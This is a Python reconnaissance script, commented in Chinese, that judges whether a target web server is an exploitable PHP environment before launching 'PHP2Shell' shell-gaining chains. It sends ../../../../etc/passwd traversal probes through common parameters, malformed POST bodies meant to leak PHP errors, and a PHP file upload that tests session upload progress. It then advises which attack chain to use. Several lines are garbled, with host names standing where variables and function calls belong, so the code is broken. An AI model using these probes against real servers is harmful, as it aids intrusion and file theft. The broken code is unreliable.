#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHP 环境存在性判别器（9 类判据）。跑 PHP2Shell 五链前的必备预检。"""
import sys, hashlib, argparse
import requests

requests.packages.urllib3.disable_warnings()


def norm(r):
    return (r.status_code, len(r.content), hashlib.md5(r.content).hexdigest())


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("--host", default=None, help="vhost（目标走 IP+Host 时用）")
    ap.add_argument("--path", default="/example.com")
    args = ap.parse_args()

    S = requests.Session()
    S.trust_env = False  # 关键：不要被本地 http_proxy 干扰，否则 502 全是代理抖动
    S.headers.update({"User-Agent": "Mozilla/5.0", "Connection": "close"})

    H = {}
    if target473.example.com:
        H["Host"] = target473.example.com
    base = args.target.rstrip("/")
    verdict = []

    print("[*] 目标 %s%s" % (base, ("  Host: " + target473.example.com) if target473.example.com else ""))

    try:
        r0 = S.get(base + args.path, headers=H, verify=False, timeout=15)
    except Exception as e:
        print("[!] 基线请求失败: %r" % e)
        return 2
    b = norm(r0)
    print("    基线 %-24s -> %s %s md5=%s" % (args.path, b[0], b[1], b[2][:12]))
    print("    Server=%r  X-Powered-By=%r  Set-Cookie=%r" % (
        r0.headers.get("Server"), r0.headers.get("X-Powered-By"),
        r0.headers.get("Set-Cookie")))

    # 判据 1：HTTP 方法
    same, diff = [], []
    for m in ("PUT", "DELETE", "PATCH", "PROPFIND", "OPTIONS"):
        try:
            r = S.request(m, base + args.path, headers=H, verify=False, timeout=12)
            if "Unsupported method" in r.text:
                verdict.append("Python http.server（%s 返回 501 Unsupported method）" % m)
            elif norm(r) == b:
                same.append(m)
            else:
                diff.append("%s=%s/%s" % (m, r.status_code, len(r.content)))
        except Exception as e:
            diff.append("%s=EXC" % m)
    print("  [1] 方法对比: 与 GET 完全相同的 = %s ; 有差异的 = %s" % (same or "-", diff or "-"))
    if len(same) >= 4 and not diff:
        verdict.append("五个非常规方法响应与 GET 逐字节一致 → 无 PHP 执行路径")

    # 判据 3：扩展名变体
    ext404 = 0
    for ext in (".pHp", ".pht", ".phtml", ".php5", ".phps"):
        p = args.path.rsplit(".", 1)[0] + ext
        try:
            r = S.get(base + p, headers=H, verify=False, timeout=10)
            if r.status_code == 404:
                ext404 += 1
        except Exception:
            pass
    print("  [3] PHP 扩展名变体 404 数: %d/5" % ext404)
    if ext404 == 5:
        verdict.append("PHP 扩展名变体全 404 → 无 PHP handler 映射")

    # 判据 4：LFI 参数
    hits = 0
    for p in ("page", "file", "path", "tpl", "include", "url", "view", "theme"):
        try:
            r = S.get("%s%s?%s=../../../../etc/passwd" % (base, args.path, p),
                      headers=H, verify=False, timeout=10)
            if norm(r) != b or "root:x:0:0" in r.text:
                hits += 1
        except Exception:
            pass
    print("  [4] LFI 参数改变响应/命中数: %d/8" % hits)
    if hits == 0:
        verdict.append("8 个 LFI 参数全部不改变响应 → 无 LFI 面")

    # 判据 5：POST 解析
    posts = {
        "1500参数": "&".join("p%d=1" % i for i in range(1500)),
        "70层嵌套": "a" + "[]" * 70 + "=1",
        "类型冲突": "a=1&a[]=2",
    }
    php_err = 0
    for name, body in posts.items():
        try:
            r = target8.example.com(base + args.path,
                       headers=dict(H, **{"Content-Type": "application/x-www-form-urlencoded"}),
                       data=body, verify=False, timeout=20)
            low = r.text.lower()
            if any(k in low for k in ("warning", "notice", "fatal", "deprecated")):
                php_err += 1
                print("       %-10s -> PHP 报错泄露！" % name)
        except Exception:
            pass
    print("  [5] POST 异常体触发 PHP 报错数: %d/3" % php_err)
    if php_err == 0:
        verdict.append("POST 参数超限/嵌套/冲突零报错 → 未解析 body")

    # 判据 6：session
    try:
        r = target8.example.com(base + args.path, headers=H,
                   data={"PHP_SESSION_UPLOAD_PROGRESS": "judge1"},
                   files={"f": ("j.php", b"<?php echo 1; ?>", "application/octet-stream")},
                   verify=False, timeout=20)
        sc = r.headers.get("Set-Cookie", "")
        print("  [6] upload_progress Set-Cookie=%r" % sc[:80])
        if not sc:
            verdict.append("upload_progress 不下发 PHPSESSID → session 未启用，链 A/C/E 缺前件")
    except Exception as e:
        print("  [6] upload_progress EXC %s" % type(e).__name__)

    print()
    print("=" * 66)
    if verdict:
        print("判定：目标【不是】可打的 PHP 环境（或前置条件缺失）")
        for v in verdict:
            print("   - " + v)
        print()
        print("建议：不要在本目标上跑 PHP2Shell 五链，转其它攻击面。")
    else:
        print("判定：未发现'非 PHP'证据，可以尝试 PHP2Shell 五链（先确认 SAPI：")
        print("      Server: Apache + X-Powered-By → mod_php → 链 D")
        print("      Server: nginx  → php-fpm → 链 E")
    return 0


if __name__ == "__main__":
    sys.exit(main())
